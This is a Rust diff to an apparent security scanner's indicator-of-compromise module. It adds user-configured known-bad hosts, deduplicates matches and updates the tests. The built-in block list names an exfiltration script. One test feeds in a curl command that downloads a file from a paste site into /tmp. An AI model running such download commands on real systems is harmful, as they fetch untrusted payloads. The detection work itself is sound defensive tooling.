@@ -29,18 +29,26 @@ const BAD_INDICATORS: &[&str] = &[
     "exfil.sh",
 ];
 
-/// Scan `text` for IOC and wallet indicators.
-pub fn scan(text: &str, findings: &mut Vec<Finding>) {
+/// Scan `text` for IOC and wallet indicators. `extra_hosts` are user-defined
+/// known-bad host/IP substrings from `[ioc]` config, checked alongside the
+/// built-in list.
+pub fn scan(text: &str, extra_hosts: &[String], findings: &mut Vec<Finding>) {
     let lower = text.to_ascii_lowercase();
-    for ioc in BAD_INDICATORS {
-        if lower.contains(ioc) {
+    let builtin = BAD_INDICATORS.iter().map(|s| s.to_string());
+    let custom = extra_hosts
+        .iter()
+        .map(|s| s.to_ascii_lowercase())
+        .filter(|s| !s.is_empty());
+    let mut seen = std::collections::HashSet::new();
+    for ioc in builtin.chain(custom) {
+        if lower.contains(&ioc) && seen.insert(ioc.clone()) {
             findings.push(
                 Finding::meta(
                     Severity::Critical,
                     "IOC_MATCH",
                     format!("Matches a known-bad indicator: {ioc}"),
                 )
-                .with_arg((*ioc).to_string()),
+                .with_arg(ioc),
             );
         }
     }
@@ -124,14 +132,18 @@ mod tests {
     #[test]
     fn flags_known_indicator() {
         let mut f = Vec::new();
-        scan("curl https://ptpb.pw/abc -o /tmp/x", &mut f);
+        scan("curl https://ptpb.pw/abc -o /tmp/x", &[], &mut f);
         assert!(f.iter().any(|x| x.code == "IOC_MATCH"), "{f:?}");
     }
 
     #[test]
     fn flags_eth_wallet() {
         let mut f = Vec::new();
-        scan("WALLET=0x52908400098527886E0F7030069857D2E4169EE7", &mut f);
+        scan(
+            "WALLET=0x52908400098527886E0F7030069857D2E4169EE7",
+            &[],
+            &mut f,
+        );
         assert!(f
             .iter()
             .any(|x| x.code == "WALLET_ADDRESS" && x.arg.as_deref().unwrap().starts_with("ETH")));
@@ -140,7 +152,11 @@ mod tests {
     #[test]
     fn flags_btc_bech32() {
         let mut f = Vec::new();
-        scan("addr=bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq", &mut f);
+        scan(
+            "addr=bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq",
+            &[],
+            &mut f,
+        );
         assert!(f.iter().any(|x| x.code == "WALLET_ADDRESS"));
     }
 
@@ -148,7 +164,7 @@ mod tests {
     fn ignores_plain_hashes() {
         // A 40-char sha1 without 0x must not look like ETH.
         let mut f = Vec::new();
-        scan("sha1=da39a3ee5e6b4b0d3255bfef95601890afd80709", &mut f);
+        scan("sha1=da39a3ee5e6b4b0d3255bfef95601890afd80709", &[], &mut f);
         assert!(f.iter().all(|x| x.code != "WALLET_ADDRESS"), "{f:?}");
     }
 }
